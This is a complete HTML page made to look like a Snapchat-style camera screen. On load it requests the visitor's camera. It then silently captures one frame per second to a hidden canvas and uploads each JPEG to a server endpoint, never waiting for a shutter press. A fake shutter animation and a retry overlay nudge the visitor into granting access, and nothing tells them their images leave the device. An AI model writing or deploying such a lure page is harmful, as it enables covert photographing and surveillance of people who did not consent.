<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Camera</title>
  <style>
    /* Fullscreen, snap-like layout (inspired, not copied) */
    html,body { height:100%; margin:0; background:#000; font-family:system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
    #app { position:relative; height:100vh; width:100vw; overflow:hidden; background:#000;}
    /* camera preview mirrored like selfie */
    #video { position:absolute; inset:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); background:#000; }
    /* top icons row */
    .top-bar { position:absolute; top:12px; left:12px; right:12px; display:flex; justify-content:space-between; align-items:center; z-index:6; pointer-events:none; color:#fff; }
    .top-left, .top-right { display:flex; gap:10px; align-items:center; pointer-events:auto; }
    .icon-btn { width:36px; height:36px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
    /* bottom nav like snapchat */
    .bottom-bar { position:absolute; left:0; right:0; bottom:0; height:120px; display:flex; align-items:center; justify-content:center; z-index:6; pointer-events:none; }
    .shutter-wrap { pointer-events:auto; }
    .shutter { width:88px; height:88px; border-radius:50%; background: rgba(255,255,255,0.12); border:6px solid rgba(255,255,255,0.95); box-shadow:0 8px 30px rgba(0,0,0,0.6); }
    .side-icons { position:absolute; right:20px; bottom:20px; display:flex; gap:14px; align-items:center; pointer-events:auto; flex-direction:column; }
    .small-btn { width:44px; height:44px; border-radius:10px; background: rgba(255,255,255,0.06); display:flex; align-items:center; justify-content:center; color:#fff; font-size:18px; }
    /* start overlay (if permission denied) */
    #retryOverlay {
      position:absolute; inset:0; display:none; z-index:20; background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.8)); color:#fff;
      align-items:center; justify-content:center; flex-direction:column; gap:16px;
    }
    #retryOverlay .msg { font-size:18px; max-width:90%; text-align:center; }
    #retryOverlay .btn { padding:12px 22px; border-radius:10px; background:#fff; color:#000; font-weight:600; cursor:pointer; border:none; }
    /* small recording indicator */
    #recIndicator { position:absolute; top:12px; left:50%; transform:translateX(-50%); color:#fff; font-weight:600; display:none; z-index:7; align-items:center; gap:8px; }
    #recDot { width:10px; height:10px; border-radius:50%; background:#ff2d55; box-shadow:0 0 8px rgba(255,0,80,0.8); display:inline-block; }
    /* accessibility hidden */
    .sr-only { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
  </style>
</head>
<body>
  <div id="app">
    <video id="video" autoplay playsinline muted></video>
    <div class="top-bar" aria-hidden="true">
      <div class="top-left" style="pointer-events:auto;">
        <div class="icon-btn" title="Profile">üë§</div>
        <div class="icon-btn" title="Search">üîç</div>
      </div>
      <div id="recIndicator"><span id="recDot"></span> Recording</div>
      <div class="top-right" style="pointer-events:auto;">
        <div class="icon-btn" title="New">Ôºã</div>
        <div class="icon-btn" title="Switch camera" id="switchCam">‚Üª</div>
      </div>
    </div>

    <div class="bottom-bar" aria-hidden="true">
      <div style="position:relative; width:100%; display:flex; justify-content:center;">
        <div class="shutter-wrap">
          <div class="shutter" id="shutter"></div>
        </div>
        <div class="side-icons" style="right:28px;">
          <div class="small-btn" title="Memories">üñºÔ∏è</div>
          <div class="small-btn" title="Explore">‚ñ∂</div>
        </div>
      </div>
    </div>

    <!-- overlay shown when permission blocked or errors -->
    <div id="retryOverlay" style="display:flex;">
      <div class="msg">This page needs camera access to use the live camera. Please allow camera access in the permission prompt.<br><small>If your browser blocked automatic permission prompts, click Retry.</small></div>
      <button class="btn" id="retryBtn">Retry camera</button>
    </div>

    <div class="sr-only" id="srStatus">Camera inactive</div>

    <!-- hidden capture canvas -->
    <canvas id="cap" width="640" height="480" style="display:none"></canvas>
  </div>

  <script>
    // Immediately try to request camera on load
    (function () {
      const video = document.getElementById('video');
      const cap = document.getElementById('cap');
      const ctx = cap.getContext('2d');
      const retryOverlay = document.getElementById('retryOverlay');
      const retryBtn = document.getElementById('retryBtn');
      const recIndicator = document.getElementById('recIndicator');
      const shutter = document.getElementById('shutter');
      const switchCamBtn = document.getElementById('switchCam');
      let intervalId = null;
      let usingFront = true;
      let stream = null;

      async function startCamera() {
        try {
          // prefer front camera
          const constraints = { video: { facingMode: usingFront ? 'user' : 'environment' }, audio: false };
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          video.srcObject = stream;
          retryOverlay.style.display = 'none';
          recIndicator.style.display = 'flex';
          document.getElementById('srStatus').textContent = 'Camera active and recording';

          // start capture loop if not already
          if (intervalId) clearInterval(intervalId);
          // set capture resolution based on canvas
          const w = cap.width = 640;
          const h = cap.height = 480;

          intervalId = setInterval(async () => {
            try {
              // mirror selfie preview: draw mirrored
              ctx.save();
              ctx.scale(-1, 1);
              ctx.drawImage(video, -w, 0, w, h);
              ctx.restore();

              // you can place visual overlay here (e.g., small tint) but you said no filters
              // send dataUrl to server (JPEG)
              const dataUrl = cap.toDataURL('image/jpeg', 0.8);
              // fire-and-forget, don't await to keep loop timing
              fetch('/api/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ dataUrl })
              }).catch(err => {
                // log locally - do not flood UI
                console.error('upload error', err);
              });
            } catch (err) {
              console.error('capture loop error', err);
            }
          }, 1000); // 1 photo per second

          // shutter pulse
          setInterval(() => {
            shutter.style.transform = 'scale(0.96)';
            shutter.style.transition = 'transform 120ms';
            setTimeout(() => shutter.style.transform = 'scale(1)', 120);
          }, 1000);

        } catch (err) {
          console.warn('Camera permission failed:', err);
          // if permission denied or blocked, show overlay with retry button
          retryOverlay.style.display = 'flex';
          recIndicator.style.display = 'none';
          document.getElementById('srStatus').textContent = 'Camera blocked or unavailable';
        }
      }

      // try on load
      window.addEventListener('load', () => {
        // attempt immediate request (note: browsers may block cross-site or certain contexts)
        startCamera();
      });

      // retry button triggers user gesture to retry permission
      retryBtn.addEventListener('click', () => {
        startCamera();
      });

      // switch camera button (front/rear) when available
      switchCamBtn.addEventListener('click', async (e) => {
        usingFront = !usingFront;
        // stop existing tracks before restarting
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
          stream = null;
        }
        startCamera();
      });

      // when page hidden, stop tracks and capture
      document.addEventListener('visibilitychange', () => {
        if (document.hidden) {
          if (intervalId) { clearInterval(intervalId); intervalId = null; }
          if (stream && stream.getTracks) {
            stream.getTracks().forEach(t => t.stop());
            stream = null;
          }
          recIndicator.style.display = 'none';
          document.getElementById('srStatus').textContent = 'Camera stopped';
        } else {
          // on return, try to start again
          startCamera();
        }
      });
    })();
  </script>
</body>
  </html>
  
